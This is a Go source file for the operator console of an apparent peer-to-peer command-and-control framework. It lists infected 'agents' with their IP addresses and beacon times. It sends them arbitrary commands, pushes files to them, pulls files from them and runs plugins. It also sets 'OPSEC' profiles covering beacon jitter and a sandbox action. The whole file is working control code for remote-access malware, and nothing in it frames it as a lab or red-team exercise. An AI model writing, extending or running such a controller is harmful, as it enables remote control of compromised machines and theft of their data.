package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"p2p-c2-framework/core"
	"p2p-c2-framework/tracker"
	"p2p-c2-framework/util"
	"strconv"
	"strings"
	"time"
)

// CLI represents the command line interface for the tracker
type CLI struct {
	tracker *tracker.Tracker
	logger  *util.Logger
	scanner *bufio.Scanner
}

// NewCLI creates a new CLI instance
func NewCLI(tracker *tracker.Tracker) *CLI {
	return &CLI{
		tracker: tracker,
		logger:  util.GetLogger("cli"),
		scanner: bufio.NewScanner(os.Stdin),
	}
}

// Run starts the CLI loop
func (cli *CLI) Run() {
	fmt.Println("=== P2P C2 Framework Tracker CLI ===")
	fmt.Printf("Tracker ID: %s\n", cli.tracker.GetPeerID()[:16]+"...")
	fmt.Println("Type 'help' for available commands")

	for {
		fmt.Print("c2> ")
		
		if !cli.scanner.Scan() {
			break
		}

		line := strings.TrimSpace(cli.scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		switch command {
		case "help", "h":
			cli.showHelp()
		case "status":
			cli.showStatus()
		case "agents", "list":
			cli.listAgents()
		case "agent":
			cli.showAgent(args)
		case "send":
			cli.sendCommand(args)
		case "upload":
			cli.uploadFile(args)
		case "download":
			cli.downloadFile(args)
		case "plugin":
			cli.runPlugin(args)
		case "opsec":
			cli.updateOpsec(args)
		case "exit", "quit", "q":
			fmt.Println("Goodbye!")
			return
		default:
			fmt.Printf("Unknown command: %s. Type 'help' for available commands.\n", command)
		}
	}
}

// showHelp displays available commands
func (cli *CLI) showHelp() {
	fmt.Println("\nAvailable commands:")
	fmt.Println("  help, h                    - Show this help message")
	fmt.Println("  status                     - Show tracker status")
	fmt.Println("  agents, list               - List all connected agents")
	fmt.Println("  agent <peer_id>            - Show detailed agent information")
	fmt.Println("  send <peer_id> <command>   - Send command to agent")
	fmt.Println("  upload <peer_id> <file>    - Upload file to agent")
	fmt.Println("  download <peer_id> <path>  - Download file from agent")
	fmt.Println("  plugin <peer_id> <plugin>  - Run plugin on agent")
	fmt.Println("  opsec <peer_id> <profile>  - Update agent OPSEC profile")
	fmt.Println("  exit, quit, q              - Exit the CLI")
	fmt.Println()
}

// showStatus displays tracker status
func (cli *CLI) showStatus() {
	status := cli.tracker.GetStatus()
	
	fmt.Println("\n=== Tracker Status ===")
	fmt.Printf("Peer ID: %s\n", status["peer_id"])
	fmt.Printf("Running: %v\n", status["is_running"])
	fmt.Printf("Connections: %v\n", status["connections"])
	fmt.Printf("Agents: %v\n", status["agents"])
	fmt.Printf("Tasks: %v\n", status["tasks"])
	fmt.Println()
}

// listAgents lists all connected agents
func (cli *CLI) listAgents() {
	agents := cli.tracker.GetAgents()
	
	if len(agents) == 0 {
		fmt.Println("No agents connected.")
		return
	}

	fmt.Println("\n=== Connected Agents ===")
	fmt.Printf("%-20s %-15s %-10s %-15s %-10s\n", "Peer ID", "IP Address", "Status", "Last Beacon", "Tasks")
	fmt.Println(strings.Repeat("-", 80))

	for peerID, agent := range agents {
		shortID := peerID[:16] + "..."
		lastBeacon := time.Since(agent.LastBeacon).Truncate(time.Second).String()
		
		fmt.Printf("%-20s %-15s %-10s %-15s %-10d\n",
			shortID,
			agent.IPAddress,
			agent.Status,
			lastBeacon,
			agent.TaskCount,
		)
	}
	fmt.Println()
}

// showAgent shows detailed information about a specific agent
func (cli *CLI) showAgent(args []string) {
	if len(args) == 0 {
		fmt.Println("Usage: agent <peer_id>")
		return
	}

	peerID := cli.findAgentByPartialID(args[0])
	if peerID == "" {
		fmt.Printf("Agent not found: %s\n", args[0])
		return
	}

	agent, exists := cli.tracker.GetAgent(peerID)
	if !exists {
		fmt.Printf("Agent not found: %s\n", args[0])
		return
	}

	fmt.Printf("\n=== Agent Details ===\n")
	fmt.Printf("Peer ID: %s\n", agent.PeerID)
	fmt.Printf("IP Address: %s\n", agent.IPAddress)
	fmt.Printf("Status: %s\n", agent.Status)
	fmt.Printf("Last Beacon: %s ago\n", time.Since(agent.LastBeacon).Truncate(time.Second))
	fmt.Printf("Task Count: %d\n", agent.TaskCount)
	fmt.Printf("Capabilities: %v\n", agent.Capabilities)
	
	if len(agent.Metadata) > 0 {
		fmt.Println("Metadata:")
		for key, value := range agent.Metadata {
			fmt.Printf("  %s: %v\n", key, value)
		}
	}
	fmt.Println()
}

// sendCommand sends a command to an agent
func (cli *CLI) sendCommand(args []string) {
	if len(args) < 2 {
		fmt.Println("Usage: send <peer_id> <command> [args...]")
		return
	}

	peerID := cli.findAgentByPartialID(args[0])
	if peerID == "" {
		fmt.Printf("Agent not found: %s\n", args[0])
		return
	}

	command := args[1]
	cmdArgs := args[2:]

	task := core.NewCommandTask(peerID, command, cmdArgs)
	
	err := cli.tracker.SendTaskToAgent(peerID, task)
	if err != nil {
		fmt.Printf("Failed to send command: %v\n", err)
		return
	}

	fmt.Printf("Command sent to agent %s: %s %v\n", peerID[:16]+"...", command, cmdArgs)
}

// uploadFile uploads a file to an agent
func (cli *CLI) uploadFile(args []string) {
	if len(args) < 2 {
		fmt.Println("Usage: upload <peer_id> <local_file>")
		return
	}

	peerID := cli.findAgentByPartialID(args[0])
	if peerID == "" {
		fmt.Printf("Agent not found: %s\n", args[0])
		return
	}

	localFile := args[1]
	
	// Read file
	fileData, err := os.ReadFile(localFile)
	if err != nil {
		fmt.Printf("Failed to read file: %v\n", err)
		return
	}

	// Extract filename
	filename := localFile
	if idx := strings.LastIndex(filename, "/"); idx != -1 {
		filename = filename[idx+1:]
	}

	task := core.NewFileUploadTask(peerID, fileData, filename)
	
	err = cli.tracker.SendTaskToAgent(peerID, task)
	if err != nil {
		fmt.Printf("Failed to send file upload task: %v\n", err)
		return
	}

	fmt.Printf("File upload task sent to agent %s: %s (%d bytes)\n", 
		peerID[:16]+"...", filename, len(fileData))
}

// downloadFile downloads a file from an agent
func (cli *CLI) downloadFile(args []string) {
	if len(args) < 2 {
		fmt.Println("Usage: download <peer_id> <remote_path>")
		return
	}

	peerID := cli.findAgentByPartialID(args[0])
	if peerID == "" {
		fmt.Printf("Agent not found: %s\n", args[0])
		return
	}

	remotePath := args[1]

	task := core.NewFileDownloadTask(peerID, remotePath)
	
	err := cli.tracker.SendTaskToAgent(peerID, task)
	if err != nil {
		fmt.Printf("Failed to send file download task: %v\n", err)
		return
	}

	fmt.Printf("File download task sent to agent %s: %s\n", 
		peerID[:16]+"...", remotePath)
}

// runPlugin runs a plugin on an agent
func (cli *CLI) runPlugin(args []string) {
	if len(args) < 2 {
		fmt.Println("Usage: plugin <peer_id> <plugin_name> [args...]")
		return
	}

	peerID := cli.findAgentByPartialID(args[0])
	if peerID == "" {
		fmt.Printf("Agent not found: %s\n", args[0])
		return
	}

	pluginName := args[1]
	pluginArgs := args[2:]

	task := core.NewPluginTask(peerID, pluginName, pluginArgs)
	
	err := cli.tracker.SendTaskToAgent(peerID, task)
	if err != nil {
		fmt.Printf("Failed to send plugin task: %v\n", err)
		return
	}

	fmt.Printf("Plugin task sent to agent %s: %s %v\n", 
		peerID[:16]+"...", pluginName, pluginArgs)
}

// updateOpsec updates an agent's OPSEC profile
func (cli *CLI) updateOpsec(args []string) {
	if len(args) < 2 {
		fmt.Println("Usage: opsec <peer_id> <beacon_interval>")
		fmt.Println("Example: opsec abc123 60")
		return
	}

	peerID := cli.findAgentByPartialID(args[0])
	if peerID == "" {
		fmt.Printf("Agent not found: %s\n", args[0])
		return
	}

	interval, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Printf("Invalid beacon interval: %s\n", args[1])
		return
	}

	profile := &core.OpsecProfilePayload{
		BeaconInterval:    interval,
		Jitter:            20,
		MaxTasksPerBeacon: 5,
		ThrottleDelay:     100,
		SandboxAction:     "continue",
	}

	err = cli.tracker.SendOpsecProfile(peerID, profile)
	if err != nil {
		fmt.Printf("Failed to send OPSEC profile: %v\n", err)
		return
	}

	fmt.Printf("OPSEC profile sent to agent %s: beacon interval %d seconds\n", 
		peerID[:16]+"...", interval)
}

// findAgentByPartialID finds an agent by partial peer ID
func (cli *CLI) findAgentByPartialID(partialID string) string {
	agents := cli.tracker.GetAgents()
	
	// First try exact match
	if _, exists := agents[partialID]; exists {
		return partialID
	}

	// Then try partial match
	var matches []string
	for peerID := range agents {
		if strings.HasPrefix(peerID, partialID) {
			matches = append(matches, peerID)
		}
	}

	if len(matches) == 1 {
		return matches[0]
	}

	if len(matches) > 1 {
		fmt.Printf("Multiple agents match '%s':\n", partialID)
		for _, match := range matches {
			fmt.Printf("  %s\n", match[:16]+"...")
		}
	}

	return ""
}

func main() {
	// Set up logging
	util.SetGlobalLogLevel(util.LogLevelInfo)

	// Create tracker configuration
	config := &tracker.TrackerConfig{
		ListenAddress:  "0.0.0.0",
		ListenPort:     8443,
		KeyDirectory:   "./keys/tracker",
		MaxConnections: 1000,
		AuthRequired:   false,
		TLSEnabled:     false,
	}

	// Create tracker
	trackerInstance, err := tracker.NewTracker(config)
	if err != nil {
		log.Fatalf("Failed to create tracker: %v", err)
	}

	// Start tracker
	err = trackerInstance.Start()
	if err != nil {
		log.Fatalf("Failed to start tracker: %v", err)
	}

	// Create and run CLI
	cli := NewCLI(trackerInstance)
	cli.Run()

	// Stop tracker
	trackerInstance.Stop()
}

